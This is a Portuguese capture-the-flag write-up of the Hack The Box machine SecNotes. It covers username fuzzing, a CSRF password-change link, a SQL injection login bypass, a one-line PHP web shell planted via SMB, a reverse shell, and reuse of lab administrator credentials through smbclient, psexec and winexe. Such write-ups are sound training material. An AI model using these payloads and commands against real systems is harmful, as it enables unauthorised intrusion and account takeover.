---
title: "Hack The Box - SecNotes"
tags: [Windows,Medium,SQLInjection,BurpSuite,Wfuzz,Psexec,Web]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/151>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 80 - Servidor Web

> Porta 445 - Servidor Samba

## Enumeração da Porta 80

Primeiro passo é abrir a página do browser pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web.png)

Tem um campo de usuário e senha, no `login.php`, também temos o campo Register, que nos redireciona para o `register.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web1.png)

Vamos explorar de dois modos essa página web, o modo que o criador da máquina `0xdf` pensou quando fez ela, e outro modo através de SQLInjection

# Exploração CSRF (Cross-Site-Request-Forgery)

Então criamos um usuário qualquer, somente para ver como é o painel de usuário do site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web3.png)

Verificamos que temos algumas informações que são importantes nos guardamos, no topo da página aparece

```
Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)
Please contact tyler@secnotes.htb using the contact link below with any questions. 
```

Sendo assim, encontramos o nome do admin que é `tyler`. Outra coisa a se verificar é que o site espera algum tipo de interação.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web4.png)

Sabendo que tyler é um usuário válido, vamos comprovar isso. Para isso jogamos uma requisição de login para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_burp1.png)

Mandamos pro Repeater, para verificar como a requisição se comporta, quando um usuário não existe ou se ele existe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_burp2.png)

Usuário Inválido

> No account found with that username.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_burp4.png)

Senha Incorreta

> The password you entered was not valid.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_burp3.png)

Ai está a diferença entre os dois, então com o `wfuzz` agora vamos realizar o fuzzing de usuários válidos

`wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=senhaerrada" --hs "No account found with that username." http://10.10.10.97/login.php`

Esse --hs não mostra as responses que baterem com a regex

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_wfuzz1.png)

Bom, ai está confirmando que o usuário `tyler` realmente existe na página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_wfuzz.png)

Show, vamos prosseguir então

Dando mais uma verificada na página após login, verificando quais opções temos nela, encontramos a `Change Password` que nos redireciona para o `change_pass.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web5.png)

Humm... verificamos que ele nem pede a senha antiga para trocar, isso já é um indicativo, e o mais impressionante é que ele passa as informações através do parâmetro GET! Puts, perfeito pra aplicarmos um CSRF, mas antes de prosseguir vamos tentar explicar um pouco do que se trata essa vulnerabilidade

```
O que é isso?

O Cross-Site Request Forgery (CSRF ou XSRF) é também conhecido como "ataque de um clique" ou "sequestro de sessão". A ideia principal é que o atacante pode forjar um URL que quando o alvo visitar, alguma ação ou comando será executado, ação essa que a vitíma a princípio não quer que seja executada. Em um site que é vulnerável a isso, o atacante pode forjar uma um link e enviar para o alvo, que deve ter uma seção ativa na página. Um dos modos de mitigar (não eliminar) o ataque é colocar apenas requisições POST, como por exemplo um CSRF Token (já foi explorado aqui - Máquina Wall - HTB), em que bypassamos essa proteção. 
```

Bom, depois de uma breve explicação nada mais funcional do que demonstrarmos na página, vamos tentar trocar a senha do usuário `secnotes` que eu criei

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web6.png)

Vimos que ele redireciona para a página `home.php` com a senha alterada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web7.png)

Vamos enviar para o BurpSuite essa requisição de troca de senha pra ver como ela se comporta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web6.png)

Aqui está no BurpSuite, ele passa a senha direto, está em POST, mas podemos alterar para GET

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web9.png)

O link que o administrador deverá clicar é `http://10.10.10.97/change_pass.php?password=123456&confirm_password=123456&submit=submit`

Hummmm... entendi, tenho que fazer o usuário `tyler` que a princípio é o administrador da página clicar em um link forjado por mim que altere a senha dele, blz, show, entendi, mas como vamos fazer isso?

Temos que procurar um local que eu possa executar ela, então voltamos a página e verificamos o campo `Contact Us` ele nos redireciona ao `contact.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web8.png)

Vamos analizar o que podemos fazer com ele, geralmente em blogs, locais de comentários são vulneráveis a esse tipo de ataque. Vamos testar de duas maneiras, uma rápida que é apenas colocando no campo da mensagem meu endereço de IP e tendo aberto o nc na porta 80 na minha Kali, que vou receber uma "conexão" da máquina. A outra é através de realmente inserir código ali dentro, é mais chata de se fazer mas é mais explicativa

Vamos lá, apenas inserimos nosso endereço de IP dentro do campo Contact Us

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web12.png)

Recebemos no NC a conexão, ou seja, comprovamos aqui que o usuário "clica" no link que é enviado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web11.png)

Agora vamos enviar a requisição maliciosa para alterar a senha do Tyler

`http://10.10.10.97/change_pass.php?password=123456&confirm_password=123456&submit=submit`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web13.png)

Enviamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web14.png)

Logamos como tyler, com a senha 123456, que foi alterada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web16.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web17.png)

Agora veficamos o campo `Notes` dele e vemos as credenciais para acessar o servidor smb

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web15.png)

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

Bom, agora vamos explorar esse usuário tyler de outra maneira

# Explorando SQLInjection

A ideia aqui é simples, é um ataque de SQL de segunda ordem (não sei bem explicar direito como isso ocorre), mas acontece pq não foi feita a sanitização correta do campo Username, onde possibilida adicionarmos comentários dentro dela, bypassar a verificação pelo banco de dados e assim, ter acesso ao painel

`' or 1=1 -- -`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web18.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web19.png)

Agora logamos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_web20.png)

Uma máquina que explica bem melhor esse tipo de sqlinjection é a Nightmare - HTB, não fiz ela ainda pq é nível Insane

Bom, com o login do servidor smb agora vamos enumerar ele e explorar

## Enumeração da porta 445

Vamos começar a enumerar ele então

Realmente, não aceita login anonimo nem nada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_smb.png)

Agora com o usuário encontrado o resultado é outro! Verificamos que temos acesso de `READ,WRITE` nessa pasta `new-site`

`smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_smb1.png)

`smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_smb2.png)

Show, conseguimos ver dois arquivos ai, pelo que parece é realmente um website novo, mas certamente não é um na porta 80 que verificamos, então vamos rodar outro nmap em todas as portas pra ver se temos mais algum resultado (esse nmap demora um pouco)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_nmap1.png)

Opa! Encontramos essa porta 8808 aberta, vamos verificar ela no browser

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_iss.png)

Bom, é outra página, mas será que é a mesma? Vamos tentar inserir algum arquivo no servidor samba, uma vez que temos permissão de escrita nele e ver se conseguimos ler o arquivo pela página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_iss1.png)

Conseguimos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_iss2.png)

# Explorando WebShell Windows

Bom, sabendo que podemos inserir arquivos dentro e executar direto do browser, teoricamente podemos inserir um webshell e executar ele ali, ganhando um cmd do usuário

Então fazemos um webshell simples e jogamos dentro do servidor samba

shell.php
```
<?php echo system($_REQUEST['cmd']); ?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_iss3.png)

Agora executamos no Browser nosso shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_iss4.png)

Bom, sabendo que temos RCE na máquina, vamos pegar um reverse shell, para isso iremos colocar um nc.exe lá dentro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_nc.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_nc1.png)

Agora pegamos a reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_nc2.png)

# Escalação de Privilégio

Olhando as pastas e arquivos qeu estão na máquina, encontramos várias referencias a Linux Subsistema, como por exemplo na pasta Desktop do User onde está a flag user.txt

bash.lnk, não é comum em sistemas windows

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv.png)

Bom, sabendo que tem bash, vamos executar então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv1.png)

Sim, somos root, mas esse root não tem muitas permissões na máquina, nem pode ler a flag de root, o que devemos fazer então é começar a procurar por arquivos de interesse dentro desse servidor, um deles que nos salta os olhos é o arquivo .bash_history não estar vazio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv2.png)

Verificamos o que tem dentro dele, senha de administrador!

`smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv3.png)

Também poderiamos encontrar essas credenciais de outro modo, através do windows mesmo

O bash do file system fica na pasta `AppData` dentro da pasta `rootfs`

C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv4.png)

É, melhor do outro modo, mas é bom pra entendermos como funciona o bash no windows

Entramos dentro do /root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv5.png)

Ai está a senha!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv6.png)

Agora é só logar como root

Podemos nos conectar ao servidor localmente e ler a flag de root

`net use \\127.0.0.1\c$ /user:administrator "u6!4ZwgwOM#^OBf#Nwnh"`

`type \\127.0.0.1\c$\users\administrator\desktop\root.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_a.png)

Através do smbclient

`smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv7.png)

Através do psexec

`psexec.py administrator@10.10.10.97`

`u6!4ZwgwOM#^OBf#Nwnh`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv8.png)

Através do winexe

`winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_priv9.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-secnotes/S_user.png)